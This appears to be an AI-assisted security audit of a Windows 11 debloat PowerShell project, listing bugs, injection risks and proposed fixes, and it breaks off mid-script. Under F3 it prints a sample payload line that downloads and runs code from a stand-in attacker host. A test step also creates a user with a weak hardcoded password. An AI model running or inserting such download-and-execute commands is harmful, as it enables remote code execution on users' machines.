# Win-11-Debloat Security Audit Report

**Auditor:** Senior Security Reviewer
**Date:** 2026-03-12
**Repository:** Win-11-Debloat
**Scope:** Full codebase review (46 files)
**Classification:** Internal / Pre-Release

---

## Executive Summary

This report documents a comprehensive security and functionality audit of the Win-11-Debloat repository. The project implements a layered Windows 11 optimization framework with four progressive tiers: Minimal, Moderate, Ultimate, and GodMode.

### Key Findings

| Severity | Count | Status |
|----------|-------|--------|
| **CRITICAL (P0)** | 4 | Must fix before any release |
| **HIGH (P1)** | 7 | Required for production quality |
| **MEDIUM (P2)** | 9 | Enhancements and tech debt |

### Overall Assessment

The codebase is a **skeleton implementation** with only 5 of approximately 50 documented modules implemented. Critical issues include:

1. A firewall module that provides **false security** by using DNS hostnames instead of IPs
2. **Command injection vulnerability** via `Invoke-Expression` in the orchestrator
3. **Syntax errors** that prevent execution on the target PowerShell 5.1 runtime
4. **Race conditions** in rollback logic that could restore wrong state

**Recommendation:** Do not release until all P0 issues are resolved and P1 issues are addressed.

---

## Audit Scope

### Files Reviewed (46 total)

#### Documentation (4 files)
- `docs/minimal_layer_win11.txt` (~1050 lines)
- `docs/moderate_layer_win11.txt` (~523 lines)
- `docs/ultimate_layer_win11.txt` (~814 lines)
- `docs/godmode_layer_win11.txt` (~908 lines)

#### Modules (25 files across 5 modules)
- `modules/minimal/disable-telemetry/` (apply.ps1, rollback.ps1, verify.ps1, preview.ps1, metadata.yaml)
- `modules/minimal/disable-widgets/` (apply.ps1, rollback.ps1, verify.ps1, preview.ps1, metadata.yaml)
- `modules/moderate/disable-xbox-services/` (apply.ps1, rollback.ps1, verify.ps1, preview.ps1, metadata.yaml)
- `modules/ultimate/firewall-telemetry-blocking/` (apply.ps1, rollback.ps1, verify.ps1, preview.ps1, metadata.yaml)
- `modules/godmode/disable-wer/` (apply.ps1, rollback.ps1, verify.ps1, preview.ps1, metadata.yaml)

#### Runtime (2 files)
- `runtime/godmode.ps1` (1078 lines)
- `runtime/utils.ps1` (423 lines)

#### Manifests (4 files)
- `layers/minimal.yaml`
- `layers/moderate.yaml`
- `layers/ultimate.yaml`
- `layers/godmode.yaml`

#### CI/CD (2 files)
- `.github/workflows/ci.yml`
- `.github/workflows/release.yml`

#### Configuration (3 files)
- `.gitattributes`
- `PSScriptAnalyzerSettings.psd1`
- `build-info.yaml`

#### Tests (3 files)
- `tests/unit/disable-telemetry.tests.ps1`
- `tests/unit/disable-widgets.tests.ps1`
- `tests/integration/minimal-layer.tests.ps1`

#### Documentation (2 files)
- `CONTRIBUTING.md`
- `SECURITY.md`

---

## Critical Findings (P0)

### F1 - Firewall Module Uses DNS Hostnames Instead of IPs **CRITICAL**

**File:** `modules/ultimate/firewall-telemetry-blocking/apply.ps1` lines 9-15

**Issue:** The `-RemoteAddress` parameter of `New-NetFirewallRule` does NOT resolve DNS names at runtime. Passing hostnames like `vortex-win.data.microsoft.com` creates firewall rules that **silently match nothing**.

**Impact:** Users believe they have blocked telemetry endpoints when in fact zero traffic is blocked. This is a **false sense of privacy protection**.

**Current Code (Vulnerable):**
```powershell
$telemetryHosts = @(
    'vortex-win.data.microsoft.com',
    'settings-win.data.microsoft.com',
    'watson.telemetry.microsoft.com',
    'telemetry.microsoft.com',
    'oca.microsoft.com'
)

foreach ($host in $telemetryHosts) {
    New-NetFirewallRule -DisplayName "Block $host" -Direction Outbound -RemoteAddress $host -Action Block
}
```

**Fix Required:**
```powershell
# AUTHOR: claude-reviewer
# SAFE: snapshot → apply → verify → rollback
# RUN INSIDE WINDOWS VM OR CI ONLY

$telemetryHosts = @(
    'vortex-win.data.microsoft.com',
    'settings-win.data.microsoft.com',
    'watson.telemetry.microsoft.com',
    'telemetry.microsoft.com',
    'oca.microsoft.com'
)

$resolvedIPs = @()
foreach ($hostname in $telemetryHosts) {
    try {
        $ips = (Resolve-DnsName -Name $hostname -Type A -ErrorAction Stop).IPAddress
        $resolvedIPs += $ips
        Write-Host "    [INFO] Resolved $hostname to: $($ips -join ', ')" -ForegroundColor Cyan
    } catch {
        Write-Host "    [WARN] Failed to resolve $hostname - skipping" -ForegroundColor Yellow
    }
}

# Store resolved IPs in snapshot for rollback
$snapshot.ResolvedIPs = $resolvedIPs

# Create single rule with all IPs
if ($resolvedIPs.Count -gt 0) {
    New-NetFirewallRule -DisplayName "WinOptimizer-Telemetry-Block" `
        -Direction Outbound `
        -RemoteAddress $resolvedIPs `
        -Action Block `
        -Profile Any
}
```

**Alternative:** Use Microsoft's published IP ranges from `https://endpoints.office.com/endpoints/worldwide` or embed known IP ranges.

---

### F2 - Rollback Backup Directory Race Condition **CRITICAL**

**Files Affected:** All 5 `rollback.ps1` files

**Issue:** All rollback scripts use the following pattern to find the "most recent" backup:

```powershell
$backupRoot = "C:\ProgramData\WinOptimizer\backup\$moduleId"
$latestBackup = Get-ChildItem -Path $backupRoot -Directory |
    Sort-Object Name -Descending |
    Select-Object -First 1
```

**Race Condition Scenarios:**

1. User runs `minimal` layer, then `moderate` layer
2. Each module creates timestamped backup: `2026-03-12_100000`, `2026-03-12_100005`
3. User wants to rollback only `minimal` layer
4. Rollback grabs `2026-03-12_100005` (wrong module's backup)

**Impact:** Rollback restores incorrect state, potentially causing system instability or data loss.

**Fix Required:**

**In apply.ps1:**
```powershell
# AUTHOR: claude-reviewer
# RUN INSIDE WINDOWS VM OR CI ONLY

# After creating backup
$backupPath = Join-Path $backupRoot $timestamp
$stateFile = "C:\ProgramData\WinOptimizer\state\$moduleId.json"

$state = @{
    ModuleId = $moduleId
    AppliedAt = $timestamp
    BackupPath = $backupPath
    Layer = $layer
}

$state | ConvertTo-Json | Set-Content -Path $stateFile -Force
```

**In rollback.ps1:**
```powershell
# AUTHOR: claude-reviewer
# RUN INSIDE WINDOWS VM OR CI ONLY

$stateFile = "C:\ProgramData\WinOptimizer\state\$moduleId.json"

if (-not (Test-Path $stateFile)) {
    Write-Host "    [ERROR] No state file found. Module was never applied or already rolled back." -ForegroundColor Red
    exit 1
}

$state = Get-Content $stateFile | ConvertFrom-Json
$backupPath = $state.BackupPath

if (-not (Test-Path $backupPath)) {
    Write-Host "    [ERROR] Backup directory not found: $backupPath" -ForegroundColor Red
    exit 1
}

# Use exact backup path, not guessed latest
```

---

### F3 - godmode.ps1 Uses Invoke-Expression **CRITICAL / SECURITY**

**File:** `runtime/godmode.ps1` lines 484, 486, 515, 539

**Issue:** `Invoke-Expression $cmd` is a **command injection vector**. If metadata.yaml files contain malicious content (supply chain attack, compromised repo), arbitrary code executes with Administrator privileges.

**Current Code (Vulnerable):**
```powershell
# Line 484
$cmd = $module.previewCommand
Invoke-Expression $cmd

# Line 515
$applyCmd = Join-Path $modulePath "apply.ps1"
Invoke-Expression "& `"$applyCmd`" -WhatIf:`$false"
```

**Attack Vector:**
```yaml
# Malicious metadata.yaml
previewCommand: "Get-Process; Invoke-WebRequest -Uri http://evil.com/payload.ps1 | iex"
```

**Fix Required:**
```powershell
# AUTHOR: claude-reviewer
# RUN INSIDE WINDOWS VM OR CI ONLY

# NEVER use Invoke-Expression for script execution
# Use call operator with explicit script paths only

$applyScript = Join-Path $modulePath "apply.ps1"
if (Test-Path $applyScript) {
    & $applyScript -WhatIf:$false
} else {
    throw "apply.ps1 not found in module: $moduleId"
}

# For preview commands, only allow predefined safe commands
$allowedPreviewCommands = @(
    'Get-Service',
    'Get-ItemProperty',
    'Get-ScheduledTask',
    'Get-NetFirewallRule',
    'Get-AppxPackage'
)

# Parse and validate command before execution
$cmdParts = $module.previewCommand -split '\s+'
$cmdName = $cmdParts[0]

if ($cmdName -notin $allowedPreviewCommands) {
    Write-Host "    [ERROR] Untrusted preview command: $cmdName" -ForegroundColor Red
    return
}

# Use call operator, not Invoke-Expression
& $cmdName @cmdParts[1..($cmdParts.Length-1)]
```

---

### F4 - godmode.ps1 Syntax Errors Prevent Execution **CRITICAL / RUNTIME**

**File:** `runtime/godmode.ps1`

**Issue 1 - Line 571:** PowerShell 5.1 does not support inline `if` as an expression.

**Current Code (Broken):**
```powershell
Write-Host $message -ForegroundColor (if ($manifest.riskLevel -eq 'HIGH') { 'Red' } elseif ($manifest.riskLevel -eq 'MEDIUM') { 'Yellow' } else { 'White' })
```

**Error:** `Unexpected token 'if' in expression or statement.`

**Issue 2 - Line 725:** `-if` is not a valid parameter name.

**Current Code (Broken):**
```powershell
Write-Host "Summary: $($results.Passed) passed, $($results.Failed) failed" -if ($results.Failed -eq 0) { 'Green' } else { 'Red' }
```

**Error:** The `-if` construct is not valid PowerShell syntax.

**Fix Required:**
```powershell
# AUTHOR: claude-reviewer
# RUN INSIDE WINDOWS VM OR CI ONLY

# Fix for Line 571 - Precompute color variable
$riskColor = switch ($manifest.riskLevel) {
    'HIGH'   { 'Red' }
    'MEDIUM' { 'Yellow' }
    default  { 'White' }
}
Write-Host $message -ForegroundColor $riskColor

# Fix for Line 725 - Proper parameter syntax
$summaryColor = if ($results.Failed -eq 0) { 'Green' } else { 'Red' }
Write-Host "Summary: $($results.Passed) passed, $($results.Failed) failed" -ForegroundColor $summaryColor
```

---

## High Severity Findings (P1)

### F5 - AllowTelemetry=0 SKU-Dependent **HIGH**

**File:** `modules/minimal/disable-telemetry/apply.ps1` line 56

**Issue:** The `AllowTelemetry` registry value is clamped by Windows based on SKU:

| SKU | Minimum Value | Name |
|-----|---------------|------|
| Enterprise/Education | 0 | Security |
| Pro | 1 | Required |
| Home | 1 | Required |

Setting `AllowTelemetry=0` on Pro/Home is **silently ineffective**. Windows internally clamps it to 1.

**Impact:** Users on Home/Pro editions believe telemetry is disabled when it is not.

**Current Code:**
```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -Name "AllowTelemetry" -Value 0 -Type DWord
```

**Fix Required:** See [Proposed SKU Guard Snippet](#proposed-sku-guard-snippet) below.

---

### F6 - 90% of Documented Modules Unimplemented **HIGH**

**Issue:** Specification documents describe approximately 50 distinct optimizations. The repository contains only 5 implemented modules.

**Implementation Coverage:**

| Layer | Documented | Implemented | Coverage |
|-------|------------|-------------|----------|
| Minimal | ~15 | 2 | 13% |
| Moderate | ~10 | 1 | 10% |
| Ultimate | ~10 | 1 | 10% |
| GodMode | ~15 | 1 | 7% |
| **Total** | **~50** | **5** | **10%** |

**Missing Critical Modules:**
- Delivery Optimization disable (Minimal)
- Activity History disable (Minimal)
- OneDrive removal (Moderate)
- Consumer AppX removal (Moderate)
- Policy-based telemetry (Ultimate)
- Service lockdown (GodMode)

**Impact:** This is a skeleton, not production-grade software. Users expecting full functionality will be disappointed.

---

### F7 - utils.ps1 Has Export-ModuleMember in a .ps1 File **HIGH**

**File:** `runtime/utils.ps1` line 407

**Issue:** `Export-ModuleMember` only works inside `.psm1` module files. Using it in a `.ps1` file throws:

```
Export-ModuleMember : The Export-ModuleMember cmdlet can only be called from inside a module.
```

**Impact:** Script fails on load, breaking the entire runtime.

**Fix Options:**

**Option 1 - Rename to module:**
```powershell
# Rename file: utils.ps1 → utils.psm1
# Import as: Import-Module .\utils.psm1
```

**Option 2 - Remove Export-ModuleMember:**
```powershell
# Remove line 407 entirely
# Rely on dot-sourcing: . .\utils.ps1
# All functions become available in caller's scope
```

---

### F8 - No JSON Structured Logging **HIGH**

**Requirement (CLAUDE.md):**
> Logs must include: timestamp, layer, operation, result, rollback reference

**File:** `runtime/godmode.ps1` lines 142-168

**Current Implementation:**
```powershell
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp [$Level] $Message" | Out-File -Append -FilePath $logPath
}
```

**Output:** Plaintext, non-parseable

**Fix Required:**
```powershell
# AUTHOR: claude-reviewer
# RUN INSIDE WINDOWS VM OR CI ONLY

function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO",
        [string]$Operation = $null,
        [string]$Layer = $null,
        [string]$RollbackRef = $null
    )

    $logEntry = @{
        timestamp = Get-Date -Format "o"
        level = $Level
        message = $Message
        operation = $Operation
        layer = $Layer
        rollbackRef = $RollbackRef
    }

    $json = $logEntry | ConvertTo-Json -Compress
    $json | Out-File -Append -FilePath $logPath -Encoding utf8

    # Also write to console for visibility
    $consoleColor = switch ($Level) {
        'ERROR' { 'Red' }
        'WARN'  { 'Yellow' }
        'INFO'  { 'White' }
        default { 'Gray' }
    }
    Write-Host "[$Level] $Message" -ForegroundColor $consoleColor
}
```

---

### F9 - Missing Packaging Scripts **HIGH**

**File:** `.github/workflows/release.yml` line 34

**Issue:** Pipeline references `.\scripts\package.ps1` which does not exist. The entire `scripts/` directory is missing.

```yaml
- name: Package Release
  run: |
    .\scripts\package.ps1 -Version ${{ github.ref_name }}
```

**Impact:** Release pipeline fails. No releases can be published.

**Fix Required:** Create `scripts/package.ps1`:

```powershell
# AUTHOR: claude-reviewer
# scripts/package.ps1
# RUN INSIDE WINDOWS VM OR CI ONLY

param(
    [Parameter(Mandatory)]
    [string]$Version
)

$ErrorActionPreference = 'Stop'

$distDir = ".\dist"
$archiveName = "Win-11-Debloat-$Version.zip"

# Clean and create dist directory
if (Test-Path $distDir) { Remove-Item $distDir -Recurse -Force }
New-Item -ItemType Directory -Path $distDir | Out-Null

# Copy release files
$releaseFiles = @(
    'runtime',
    'modules',
    'layers',
    'README.md',
    'LICENSE'
)

foreach ($file in $releaseFiles) {
    if (Test-Path $file) {
        Copy-Item -Path $file -Destination $distDir -Recurse
    }
}

# Create version file
@{
    version = $Version
    buildDate = Get-Date -Format "o"
    commit = $env:GITHUB_SHA
} | ConvertTo-Json | Set-Content "$distDir\version.json"

# Create archive
Compress-Archive -Path "$distDir\*" -DestinationPath ".\$archiveName" -Force

Write-Host "Package created: $archiveName" -ForegroundColor Green
```

---

### F10 - Xbox verify.ps1 Logic Inverted **HIGH**

**File:** `modules/moderate/disable-xbox-services/verify.ps1` lines 11-13

**Issue:** The verification logic is backwards. It flags as failure when services ARE disabled (the desired state).

**Current Code (Inverted):**
```powershell
foreach ($svc in $xboxServices) {
    $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
    if ($service.StartType -eq 'Disabled') {
        Write-Host "    [FAIL] $svc is disabled" -ForegroundColor Red
        $failed++
    }
}
```

**Correct Logic:**
- apply.ps1 sets services to `Manual` (not `Disabled`)
- verify.ps1 should confirm they are NOT `Automatic` and NOT `Running`

**Fix Required:**
```powershell
# AUTHOR: claude-reviewer
# RUN INSIDE WINDOWS VM OR CI ONLY

$xboxServices = @(
    'XboxGipSvc',
    'XblAuthManager',
    'XblGameSave',
    'XboxNetApiSvc'
)

$passed = 0
$failed = 0

foreach ($svc in $xboxServices) {
    $service = Get-Service -Name $svc -ErrorAction SilentlyContinue

    if ($null -eq $service) {
        Write-Host "    [SKIP] $svc not found" -ForegroundColor Yellow
        continue
    }

    # Success: Service is Manual or Disabled AND not Running
    if ($service.StartType -in @('Manual', 'Disabled') -and $service.Status -ne 'Running') {
        Write-Host "    [PASS] $svc is $($service.StartType) and $($service.Status)" -ForegroundColor Green
        $passed++
    } else {
        Write-Host "    [FAIL] $svc is $($service.StartType) and $($service.Status)" -ForegroundColor Red
        $failed++
    }
}

exit $failed
```

---

### F11 - disable-wer/rollback.ps1 Incomplete **HIGH**

**File:** `modules/godmode/disable-wer/rollback.ps1`

**Issues:**

1. **Missing DefaultConsent restore:** apply.ps1 sets `DefaultConsent=0` at line 47-48, but rollback.ps1 never restores it.

2. **Duplicate line in apply.ps1:** Line 48 duplicates line 47 exactly:
```powershell
Set-ItemProperty -Path $consentKey -Name "DefaultConsent" -Value 0 -Type DWord
Set-ItemProperty -Path $consentKey -Name "DefaultConsent" -Value 0 -Type DWord  # Duplicate
```

**Fix for rollback.ps1:**
```powershell
# AUTHOR: claude-reviewer
# RUN INSIDE WINDOWS VM OR CI ONLY

# ... existing restore code ...

# Restore DefaultConsent from snapshot
$consentKey = "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Consent"
if ($snapshot.DefaultConsent) {
    Set-ItemProperty -Path $consentKey -Name "DefaultConsent" -Value $snapshot.DefaultConsent -Type DWord
    Write-Host "    [OK] Restored DefaultConsent to $($snapshot.DefaultConsent)" -ForegroundColor Green
}
```

**Fix for apply.ps1:** Remove duplicate line 48.

---

## Medium Severity Findings (P2)

### F12 - CI Workflow Uses Nonexistent Action **MEDIUM**

**Files:** `.github/workflows/ci.yml`, `.github/workflows/release.yml`

**Issue:** Both workflows reference `PowerShell/PowerShell@v2` which does not exist as a GitHub Action.

```yaml
- name: Setup PowerShell
  uses: PowerShell/PowerShell@v2  # Does not exist
```

**Impact:** CI fails on startup.

**Fix:** Remove these steps entirely. Windows-latest runners include PowerShell 5.1 and pwsh 7.x by default.

---

### F13 - CI Integration Test Creates Restore Point on Ephemeral VM **MEDIUM**

**File:** `.github/workflows/ci.yml` line 80

**Issue:** `Checkpoint-Computer` may fail on GitHub-hosted runners that don't support System Restore.

```yaml
- name: Integration Test
  run: |
    Checkpoint-Computer -Description "Pre-test"  # May fail
```

**Fix:**
```powershell
try {
    Checkpoint-Computer -Description "Pre-test" -ErrorAction Stop
} catch {
    Write-Host "System Restore not available on this runner - skipping checkpoint" -ForegroundColor Yellow
}
```

---

### F14 - release.yml GPG Step Unreachable **MEDIUM**

**File:** `.github/workflows/release.yml` line 51

**Issue:** GPG signing step has condition `if: runner.os == 'Linux'` but the job runs on `self-hosted-windows-signer`.

```yaml
jobs:
  release:
    runs-on: self-hosted-windows-signer
    steps:
      - name: Sign with GPG
        if: runner.os == 'Linux'  # Never true
```

**Impact:** Releases are never GPG-signed.

**Fix Options:**
1. Run GPG step on a Linux job and download artifacts
2. Use gpg4win on Windows: `gpg4win --sign dist/*.zip`

---

### F15 - upload-artifact@v3 Deprecated **MEDIUM**

**Files:** Both CI workflows

**Issue:** `actions/upload-artifact@v3` and `actions/download-artifact@v3` are deprecated.

**Fix:** Upgrade to v4:
```yaml
- uses: actions/upload-artifact@v4
- uses: actions/download-artifact@v4
```

---

### F16 - Metadata Schema Mismatch **MEDIUM**

**Issue:** Discrepancy between documented schema and actual implementation.

**CONTRIBUTING.md documents:**
```yaml
id: module-id
title: Module Title
layer: minimal
severity: low
reversible: true
dependencies: []  # Not used in actual modules
preview_cmd: Get-Service
apply_cmds: []
rollback_cmds: []
verify: []
```

**Actual modules use:**
```yaml
id: module-id
title: Module Title
layer: minimal
severity: low
reversible: true
summary: Description text
whatChanges: []
riskLevel: LOW
previewCommand: Get-Service
```

**Impact:** Confusion for contributors. No CI validation.

**Fix:** Unify schema and add CI validation job.

---

### F17 - No Required Script Annotations **MEDIUM**

**Issue:** None of the 20 .ps1 files contain the required annotation from project spec:

```powershell
# RUN INSIDE WINDOWS VM OR CI ONLY
```

**Impact:** Risk of accidental execution on non-Windows systems (developer's Arch Linux machine).

**Fix:** Add header comment to all .ps1 files:
```powershell
# AUTHOR: Win-11-Debloat
# SAFE: snapshot → apply → verify → rollback
# RUN INSIDE WINDOWS VM OR CI ONLY
```

---

### F18 - No Pre-Commit Hook for File Permissions **MEDIUM**

**Issue:** Spec requires ensuring files are non-executable on Arch build host. No hook exists.

**Impact:** PowerShell files may have executable bits set, causing issues on some systems.

**Fix:** See [Proposed Pre-Commit Hook](#proposed-pre-commit-hook) below.

---

### F19 - Idempotency Weakness in Backup Accumulation **MEDIUM**

**Issue:** Every `apply.ps1` creates a new timestamped backup directory. Re-running the same module accumulates orphaned backup directories.

```
C:\ProgramData\WinOptimizer\backup\disable-telemetry\
├── 2026-03-12_100000\
├── 2026-03-12_100500\  # Second run
├── 2026-03-12_101000\  # Third run
└── 2026-03-12_101500\  # Fourth run
```

**Impact:** Disk space waste. Confusion about which backup is valid.

**Fix:** Check state before applying:
```powershell
# AUTHOR: claude-reviewer
# RUN INSIDE WINDOWS VM OR CI ONLY

$stateFile = "C:\ProgramData\WinOptimizer\state\$moduleId.json"

if (Test-Path $stateFile) {
    $state = Get-Content $stateFile | ConvertFrom-Json
    Write-Host "    [WARN] Module already applied at $($state.AppliedAt)" -ForegroundColor Yellow
    Write-Host "    [INFO] Run rollback first, or use -Force to reapply" -ForegroundColor Cyan

    if (-not $Force) {
        exit 0
    }
}
```

---

### F20 - WaaSMedicSvc Mentioned in Ultimate Spec Doc **MEDIUM**

**File:** `docs/ultimate_layer_win11.txt` line 124

**Issue:** Document lists WaaSMedicSvc (Windows Update Medic Service) which is a **PROTECTED** component per CLAUDE.md.

```
Windows Update Medic Service (WaaSMedicSvc)
  - Status: DO NOT DISABLE
  - Notes: Required for Windows Update self-healing
```

While the doc says "DO NOT DISABLE", its mere presence in a list of services is misleading and could lead to accidental implementation.

**Impact:** If someone implements this as a module, Windows Update self-healing breaks.

**Fix:** Remove from documentation entirely, or move to a separate "PROTECTED - NEVER TOUCH" section with clear warnings.

---

## Threat and Regression Matrix

### Minimal Layer Impact Assessment

| Module | Features Disabled | User Impact | Severity | Reversible | Rollback Difficulty |
|--------|-------------------|-------------|----------|------------|---------------------|
| disable-telemetry | DiagTrack service, dmwappushsvc, AllowTelemetry policy | Less diagnostic data to Microsoft. Windows Insider functionality may break. | Low | Yes | Easy |
| disable-widgets | Widget panel, WebExperience processes | No weather/news/widgets taskbar panel | Low | Yes | Easy |

### Moderate Layer Impact Assessment

| Module | Features Disabled | User Impact | Severity | Reversible | Rollback Difficulty |
|--------|-------------------|-------------|----------|------------|---------------------|
| disable-xbox-services | XboxGipSvc, XblAuthManager, XblGameSave, XboxNetApiSvc | No Xbox gaming features, game save sync, or Xbox app functionality | Low | Yes | Easy |

### Ultimate Layer Impact Assessment

| Module | Features Disabled | User Impact | Severity | Reversible | Rollback Difficulty |
|--------|-------------------|-------------|----------|------------|---------------------|
| firewall-telemetry-blocking | Outbound traffic to Microsoft telemetry endpoints | May affect Microsoft Store, Office activation, Windows activation, Defender updates | Medium | Yes | Easy |

### GodMode Layer Impact Assessment

| Module | Features Disabled | User Impact | Severity | Reversible | Rollback Difficulty |
|--------|-------------------|-------------|----------|------------|---------------------|
| disable-wer | Windows Error Reporting service, error submission registry keys | No crash reports to Microsoft. Harder to debug application issues. Some apps depend on WER for crash handling. | High | Yes | Easy |

---

## Top 5 Support Risk Commands

These commands carry the highest risk of user support tickets and should be thoroughly tested.

### 1. Firewall Telemetry Blocking

**Risk:** Can break Microsoft Store downloads, Office 365 activation, Windows license activation if wrong IPs are blocked.

**Test Procedure:**
```powershell
# RUN INSIDE WINDOWS VM OR CI ONLY

# Apply the firewall rules
.\modules\ultimate\firewall-telemetry-blocking\apply.ps1

# Test Microsoft Store
Start-Process ms-windows-store:
# Verify: Can browse and download apps

# Test Office activation (if installed)
& "C:\Program Files\Microsoft Office\Office16\OSPP.VBS" /dstatus

# Test Windows activation
slmgr /xpr
```

### 2. AllowTelemetry=0 on Non-Enterprise SKUs

**Risk:** Silently ineffective. Users believe telemetry is disabled when Windows internally clamps to value 1.

**Test Procedure:**
```powershell
# RUN INSIDE WINDOWS VM OR CI ONLY

# Check SKU first
$sku = (Get-CimInstance Win32_OperatingSystem).OperatingSystemSKU
Write-Host "Windows SKU: $sku"

# Apply telemetry setting
.\modules\minimal\disable-telemetry\apply.ps1

# Force policy update
gpupdate /force

# Verify actual value (may differ from set value)
$actual = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" -Name "AllowTelemetry" -ErrorAction SilentlyContinue).AllowTelemetry
Write-Host "Effective AllowTelemetry: $actual"
```

### 3. AppX Provisioned Package Removal (Not Yet Implemented)

**Risk:** Provisioned packages cannot easily be restored. New user accounts won't have these apps.

**Test Procedure:**
```powershell
# RUN INSIDE WINDOWS VM OR CI ONLY

# Before removal - document provisioned packages
Get-AppxProvisionedPackage -Online | Select-Object DisplayName | Export-Csv "before-removal.csv"

# After removal - create new local user
net user testuser Password123! /add

# Login as testuser
# Verify: Which apps are missing?

# Restore requires original sources or clean install
```

### 4. WaaSMedicSvc Disable (MUST NEVER BE IMPLEMENTED)

**Risk:** CRITICAL - Breaks Windows Update self-healing mechanism.

**Action:** This must be added to the protected services list in `runtime/godmode.ps1` and `runtime/utils.ps1`:

```powershell
$PROTECTED_SERVICES = @(
    'WaaSMedicSvc',      # Windows Update Medic
    'wuauserv',          # Windows Update
    'TrustedInstaller',  # Windows Modules Installer
    'BITS'               # Background Intelligent Transfer
)
```

### 5. OneDrive Uninstall (In Moderate Spec)

**Risk:** Removes cloud backup functionality. Users may lose access to synced files.

**Test Procedure:**
```powershell
# RUN INSIDE WINDOWS VM OR CI ONLY

# Before uninstall - check for OneDrive files
$oneDrivePath = [Environment]::GetFolderPath('UserProfile') + '\OneDrive'
if (Test-Path $oneDrivePath) {
    Write-Host "OneDrive folder exists with files - warn user!" -ForegroundColor Yellow
    Get-ChildItem $oneDrivePath -Recurse | Measure-Object
}

# After uninstall - verify reinstall is possible
Test-Path "$env:SystemRoot\SysWOW64\OneDriveSetup.exe"
```

---

## CI Pipeline Recommendations

### Immediate Fixes Required

| Priority | Issue | Fix |
|----------|-------|-----|
| 1 | Nonexistent `PowerShell/PowerShell@v2` action | Remove steps entirely |
| 2 | Deprecated `upload-artifact@v3` | Upgrade to v4 |
| 3 | GPG signing never executes | Move to Linux job or use gpg4win |
| 4 | `Checkpoint-Computer` may fail | Wrap in try/catch |
| 5 | Missing `scripts/package.ps1` | Create file (see F9) |

### New CI Jobs to Add

```yaml
# Add to .github/workflows/ci.yml

jobs:
  # ... existing jobs ...

  metadata-validation:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Validate YAML syntax
        run: |
          find modules -name "metadata.yaml" -exec yamllint {} \;

      - name: Validate required fields
        run: |
          for f in modules/*/metadata.yaml; do
            yq e '.id, .title, .layer, .severity, .reversible' "$f" > /dev/null
          done

  file-permissions:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Check no executable bits
        run: |
          EXEC=$(find . -path ./.git -prune -o -type f -perm /111 -print)
          if [ -n "$EXEC" ]; then
            echo "Files with executable permission:"
            echo "$EXEC"
            exit 1
          fi

  pester-tests:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run all Pester tests
        shell: pwsh
        run: |
          Install-Module Pester -Force -SkipPublisherCheck
          $results = Invoke-Pester -Path ./tests -PassThru
          if ($results.FailedCount -gt 0) {
            exit 1
          }
```

### Missing Test Coverage

| Module | Unit Test | Integration Test | Status |
|--------|-----------|------------------|--------|
| disable-telemetry | Yes | Yes | Covered |
| disable-widgets | Yes | Yes | Covered |
| disable-xbox-services | No | No | **MISSING** |
| firewall-telemetry-blocking | No | No | **MISSING** |
| disable-wer | No | No | **MISSING** |

---

## Priority Task List

### P0 - Critical (Must Fix Before Any Release)

| # | Task | File(s) | Owner |
|---|------|---------|-------|
| 1 | Fix firewall module: resolve DNS to IPs at apply time | `modules/ultimate/firewall-telemetry-blocking/apply.ps1` | |
| 2 | Fix rollback backup resolution: write exact backup path to state file | All `rollback.ps1` files, `runtime/godmode.ps1` | |
| 3 | Remove `Invoke-Expression` - use call operator | `runtime/godmode.ps1` lines 484-486, 515, 539 | |
| 4 | Fix syntax errors preventing PS 5.1 execution | `runtime/godmode.ps1` lines 571, 725 | |
| 5 | Add SKU-guard to AllowTelemetry setting | `modules/minimal/disable-telemetry/apply.ps1` | |
| 6 | Add WaaSMedicSvc to protected services list | `runtime/godmode.ps1`, `runtime/utils.ps1` | |

### P1 - High (Required for Production Quality)

| # | Task | File(s) | Owner |
|---|------|---------|-------|
| 7 | Fix utils.ps1: rename to .psm1 or remove Export-ModuleMember | `runtime/utils.ps1` | |
| 8 | Implement JSON structured logging | `runtime/godmode.ps1` Write-Log function | |
| 9 | Fix Xbox verify.ps1 inverted logic | `modules/moderate/disable-xbox-services/verify.ps1` | |
| 10 | Fix disable-wer rollback to restore DefaultConsent | `modules/godmode/disable-wer/rollback.ps1` | |
| 11 | Remove duplicate SetItemProperty line | `modules/godmode/disable-wer/apply.ps1` line 48 | |
| 12 | Create scripts/package.ps1 | `scripts/package.ps1` (new file) | |
| 13 | Add unit tests for moderate/ultimate/godmode modules | `tests/unit/*.tests.ps1` | |
| 14 | Add metadata `dependencies` field and validate in CI | All `metadata.yaml` files | |
| 15 | Add `# RUN INSIDE WINDOWS VM OR CI ONLY` header | All 20 `.ps1` files | |
| 16 | Unify metadata schema between docs and implementation | `CONTRIBUTING.md`, all modules | |
| 17 | Add idempotency checks to all apply.ps1 | All `apply.ps1` files | |

### P2 - Enhancements

| # | Task | File(s) | Owner |
|---|------|---------|-------|
| 18 | Implement remaining ~45 modules from spec docs | `modules/` | |
| 19 | Fix CI workflow issues | `.github/workflows/*.yml` | |
| 20 | Add pre-commit hook for file permissions | `.git/hooks/pre-commit` | |
| 21 | Create build-info.template.json | Repository root | |
| 22 | Add integration tests for all layers | `tests/integration/` | |
| 23 | Add CHANGELOG.md | Repository root | |
| 24 | Generate plan.json output from preview.ps1 | All `preview.ps1` files | |

---

## Proposed Patches

### Proposed Pre-Commit Hook

Create `.git/hooks/pre-commit`:

```sh
#!/bin/sh
# AUTHOR: claude-reviewer
# Ensure no files have executable bits on Arch build host
# Place in .git/hooks/pre-commit and chmod +x

set -e

# Check for executable files (excluding .git directory)
EXEC_FILES=$(find . -path ./.git -prune -o -type f -perm /111 -print 2>/dev/null)

if [ -n "$EXEC_FILES" ]; then
    echo "ERROR: Files with executable permission detected:"
    echo "$EXEC_FILES"
    echo ""
    echo "Fix with: chmod 644 <file>"
    echo "Or run:   find . -path ./.git -prune -o -type f -exec chmod 644 {} \\;"
    exit 1
fi

# Check for CRLF line endings in PowerShell files
